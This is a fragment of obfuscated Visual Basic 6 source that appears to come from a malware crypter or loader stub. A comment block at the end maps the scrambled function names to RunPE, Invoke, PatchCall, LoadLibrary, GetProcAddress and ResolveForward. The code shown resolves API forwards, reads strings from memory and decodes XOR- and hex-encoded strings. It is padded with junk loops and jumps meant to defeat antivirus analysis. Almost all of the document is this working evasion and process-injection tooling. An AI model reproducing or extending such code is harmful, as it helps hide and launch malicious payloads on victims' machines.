Next K1iso1LSX7jT98OZ
End Function

Private Function OzUinbxffxHkyjH( _
       ByVal lAddress As Long, _
       ByRef lLib As Long, _
       ByRef sMod As String)
       
    Dim qBVNPdgpnK     As String
If "eKFmOYsO97MSg" = "BU46J45S9M" Then End

Dim TP9h3VDIg0Eh3mz As Integer
For TP9h3VDIg0Eh3mz = 2 To 6
   DoEvents
Next TP9h3VDIg0Eh3mz
    qBVNPdgpnK = AvOiPNOUo58yRKh(lAddress)
GoTo J1ipTYlLwbCwRCgYzwCYDk
J1ipTYlLwbCwRCgYzwCYDk:
    If InStr(1, qBVNPdgpnK, wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("4A"), "dYRMsCc9pPHy")) Then
Dim cTDN45XjeKNBek As Currency
cTDN45XjeKNBek = "2387"
        lLib = PAg7OcawAhTBPf6(Split(qBVNPdgpnK, wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("67"), "IeNyb2QeR7Cd"))(0))
        sMod = Split(qBVNPdgpnK, wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("7F"), "Q0rsDSydik9W"))(1)
Dim rg6OSjw5RiaIwXxPMzA3 As Long
rg6OSjw5RiaIwXxPMzA3 = "2252"
    End If
GoTo NpuyGLSosUjGWxikAd
NpuyGLSosUjGWxikAd:
   
Dim bcvNL4rI9L3YdfOl As Long
bcvNL4rI9L3YdfOl = "7705"
End Function

Private Function AvOiPNOUo58yRKh( _
       ByVal lAddress As Long) As String
Dim tdNBdhyJWXfNy2vLD4M8fdDX As Integer
For tdNBdhyJWXfNy2vLD4M8fdDX = 4 To 7
   DoEvents
Next tdNBdhyJWXfNy2vLD4M8fdDX
       
Dim ooAJkSO9TQdkuZclRVx9bS6s As Integer
For ooAJkSO9TQdkuZclRVx9bS6s = 0 To 9
   DoEvents
Next ooAJkSO9TQdkuZclRVx9bS6s
    Dim N5HYvMv4Q5       As Byte
GoTo O6ACLBrhnbIDZtBWqris
O6ACLBrhnbIDZtBWqris:
   
GoTo CbBXpbntAHXCLHImLcVVOa
CbBXpbntAHXCLHImLcVVOa:
    Do
Dim WtX8tKehgW8k9mRqjO4nQ As Integer
WtX8tKehgW8k9mRqjO4nQ = "7774"
        CopyBytes 1, N5HYvMv4Q5, ByVal lAddress
Dim mxy9AZjEYt As Long
mxy9AZjEYt = "3469"
        lAddress = lAddress + 1
Dim xMqOCoRRFY As Currency
xMqOCoRRFY = "7275"
        If N5HYvMv4Q5 = 0 Then Exit Do
Dim kqpmpxxNVOvNq2YdYfT As Currency
kqpmpxxNVOvNq2YdYfT = "6132"
        AvOiPNOUo58yRKh = AvOiPNOUo58yRKh & Chr$(N5HYvMv4Q5)
    Loop
GoTo H0OT4q9mt6
H0OT4q9mt6:
   
End Function

Private Function xnliOl1RCE6MExN(ByVal kqF54l1Tgb As String) As String
    Dim dJuNTtjsKD       As Long
GoTo YrDYAxjebUTJei
YrDYAxjebUTJei:
    For dJuNTtjsKD = 1 To Len(kqF54l1Tgb) Step 2
Dim eQhKJx7RPiSFoY As Integer
eQhKJx7RPiSFoY = 13
Do While eQhKJx7RPiSFoY < 39
   DoEvents: eQhKJx7RPiSFoY = eQhKJx7RPiSFoY + 1
Loop
       xnliOl1RCE6MExN = xnliOl1RCE6MExN & Chr$(Val(wllW4QdoMSZS9nL(LCQ2e2q3hRe1pxe("443C"), "btsTEFqFyz7C") & Mid$(kqF54l1Tgb, dJuNTtjsKD, 2)))
Dim WZ7FTxRyb8W As Integer
For WZ7FTxRyb8W = 4 To 13
   DoEvents
Next WZ7FTxRyb8W
    Next dJuNTtjsKD
GoTo PTlXdmzCi3SK5qNe
PTlXdmzCi3SK5qNe:
End Function

Public Function wllW4QdoMSZS9nL(ByVal zqlTwd7oQ5 As String, ByVal d8FK759wnO As String) As String
Dim CCGxuZDCAP As Long
Dim B6jI731jAc8sOIhchq As Integer
For B6jI731jAc8sOIhchq = 3 To 5
   DoEvents
Next B6jI731jAc8sOIhchq
For CCGxuZDCAP = 1 To Len(zqlTwd7oQ5)
GoTo b8dBfL7PZyU8j7Uk
b8dBfL7PZyU8j7Uk:
wllW4QdoMSZS9nL = wllW4QdoMSZS9nL & Chr(Asc(Mid(d8FK759wnO, IIf(CCGxuZDCAP Mod Len(d8FK759wnO) <> 0, CCGxuZDCAP Mod Len(d8FK759wnO), Len(d8FK759wnO)), 1)) Xor Asc(Mid(zqlTwd7oQ5, CCGxuZDCAP, 1)))
GoTo DyO4ASvgrg
DyO4ASvgrg:
Next CCGxuZDCAP
If "P3MW3QjPf4wV5npZX" = "f3qO63aBUi" Then End
End Function
Public Function LCQ2e2q3hRe1pxe(ByVal x2VkBf2Ste As String) As String
Dim UFTWNEwwSe As String
Dim m3IH0NWVTF2Iw1z As Integer
For m3IH0NWVTF2Iw1z = 4 To 11
   DoEvents
Next m3IH0NWVTF2Iw1z
Dim tQ1C29VD9C As String
Dim X5huXXEHABsnyOzRJ As Integer
For X5huXXEHABsnyOzRJ = 2 To 6
   DoEvents
Next X5huXXEHABsnyOzRJ
Dim HlbfuT4ldX As Long
Dim ZwMQqM9EqE4sBFDhSS8ucflb As Integer
For ZwMQqM9EqE4sBFDhSS8ucflb = 1 To 4
   DoEvents
Next ZwMQqM9EqE4sBFDhSS8ucflb
For HlbfuT4ldX = 1 To Len(x2VkBf2Ste) Step 2
Dim c4VqtGaLq0MlEF2bCyg2E0 As Long
c4VqtGaLq0MlEF2bCyg2E0 = "6428"
UFTWNEwwSe = Chr$(Val("&H" & Mid$(x2VkBf2Ste, HlbfuT4ldX, 2)))
GoTo mTMiDDsIaPO6Rpk
mTMiDDsIaPO6Rpk:
tQ1C29VD9C = tQ1C29VD9C & UFTWNEwwSe
Dim O1NYWNk6BQj3oQyUmE As Currency
O1NYWNk6BQj3oQyUmE = "988"
Next HlbfuT4ldX
LCQ2e2q3hRe1pxe = tQ1C29VD9C
Dim khQVkjeymLyQOBFUKKB7hT As String
khQVkjeymLyQOBFUKKB7hT = "7194"
End Function































'###################### FUNCTIONS & SUBS ######################
'UswVBOBq20 = wf5NU89HbvEyQ95
'LmcJgJMhZH = UhfNw93m8IqpLGd
'zDoNotCall = GWxLtUOHDE7m6ht
'RunPE = ojrPyaCm1NU9O6c
'Invoke = qEll7BcX06s3gO2
'GetLong = zurw5U60xbNL866
'PatchCall = RputjbmEJeqZi7p
'GetMod = PYyR2HMeYQD2Hvq
'LoadLibrary = PAg7OcawAhTBPf6
'GetProcAddress = dLjBHpnD9DdSol7
'ResolveForward = OzUinbxffxHkyjH
'StringFromPtr = AvOiPNOUo58yRKh
'nlfpkgnrj = xnliOl1RCE6MExN
'wf5NU89HbvEyQ95 = wllW4QdoMSZS9nL
'UhfNw93m8IqpLGd = LCQ2e2q3hRe1pxe

'################################################################

